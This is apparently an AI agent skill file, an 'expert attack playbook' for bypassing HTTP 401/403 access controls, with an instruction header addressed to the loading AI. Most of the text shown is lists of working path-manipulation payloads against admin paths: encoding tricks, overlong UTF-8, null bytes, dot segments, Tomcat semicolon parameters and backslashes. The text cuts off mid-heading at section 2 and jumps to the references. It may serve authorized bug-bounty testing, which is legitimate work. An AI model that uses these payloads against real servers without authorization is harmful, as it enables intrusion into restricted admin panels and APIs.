---
name: 401-403-bypass-techniques
description: 401/403 bypass playbook. Use when encountering access-denied responses on admin panels, API endpoints, or restricted paths. Covers path manipulation, HTTP method tampering, header injection, protocol downgrade, and automated bypass tools.
scope: web2
---
401/403 bypass playbook. Use when encountering access-denied responses on admin panels, API endpoints, or restricted paths. Covers path manipulation, HTTP method tampering, header injection, protocol downgrade, and automated bypass tools.

# SKILL: 401/403 Bypass Techniques — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Comprehensive 401/403 forbidden bypass techniques. Covers path normalization tricks, HTTP method override, header-based bypasses (X-Original-URL, X-Forwarded-For), protocol version tricks, and combination attacks. Base models typically know 2-3 header bypasses but miss the full matrix of path manipulation variants and verb+path combos.


## 1. PATH MANIPULATION BYPASSES

The core idea: the reverse proxy/WAF checks one path format, but the backend normalizes differently.

### 1.1 Trailing Slash / Missing Slash

/admin      → 403
/admin/     → 200  ✓ (trailing slash)
/admin/.    → 200  ✓ (trailing dot)

### 1.2 Case Sensitivity

/admin      → 403
/Admin      → 200  ✓
/ADMIN      → 200  ✓
/aDmIn      → 200  ✓

Works when: proxy rule is case-sensitive but backend is case-insensitive (common on Windows/IIS).

### 1.3 URL Encoding

/admin          → 403
/%61dmin        → 200  ✓ (encode 'a')
/admi%6e        → 200  ✓ (encode 'n')
/%61%64%6d%69%6e → 200  ✓ (full encode)

### 1.4 Double URL Encoding

/admin              → 403
/%2561dmin          → 200  ✓ (%25 = %, decoded twice: %61 → a)
/admin%252f         → 200  ✓
/admin..%252f       → 200  ✓

### 1.5 Unicode / UTF-8 Encoding

/admin          → 403
/admi%C0%AE     → 200  ✓ (overlong UTF-8 for '.')
/admi%C0%6E     → 200  ✓ (overlong encoding)
/%C0%AFadmin    → 200  ✓ (overlong '/')

### 1.6 Dot-Segment / Path Traversal

/admin          → 403
/./admin        → 200  ✓
//admin         → 200  ✓
/admin/./       → 200  ✓
/.//admin       → 200  ✓
/admin..;/      → 200  ✓ (Tomcat path parameter)

### 1.7 Null Byte

/admin          → 403
/admin%00       → 200  ✓
/admin%00.json  → 200  ✓
/%00/admin      → 200  ✓

### 1.8 Path Parameter Injection

/admin          → 403
/admin;foo=bar  → 200  ✓ (Tomcat/Java treats ; as path param)
/admin;         → 200  ✓
/admin;x        → 200  ✓

### 1.9 Trailing Special Characters

/admin%20 (space)  /admin%09 (tab)   /admin? (empty query)
/admin.json        /admin.html       /admin/~

### 1.10 Backslash (Windows/IIS)

/admin\    /admin\..\/    \..\admin

### 1.11 Combined Path Tricks

///admin///    /./admin/./    /admin/..;/admin (Tomcat)    /%2e/admin

---

## 2. HTT
...

## References
- Source: https://github.com/yaklang/hack-skills/blob/main/skills/401-403-bypass-techniques/SKILL.md
- License: MIT — Copyright (c) 2026 VillanCh
- Distilled for bbhunter by scripts/import_hack_skills.py
